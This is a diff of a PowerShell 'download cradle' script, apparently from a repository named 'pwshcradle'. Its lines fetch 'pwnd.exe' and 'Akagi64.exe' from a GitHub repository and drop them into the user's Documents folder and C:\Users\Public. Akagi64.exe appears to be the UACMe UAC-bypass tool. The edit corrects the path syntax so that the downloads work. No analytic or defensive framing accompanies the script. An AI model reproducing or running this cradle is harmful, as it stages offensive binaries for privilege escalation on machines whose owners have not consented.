@@ -1,6 +1,6 @@
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "%USERPROFILE%\Documents\demo.exe"
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "$env:USERPROFILE\Documents\demo.exe"
 
-Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "%USERPROFILE%\Documents\Akagi.exe"
+Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "$env:USERPROFILE\Documents\Akagi.exe"
 
 Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "C:\Users\Public\Akagi.exe"
 
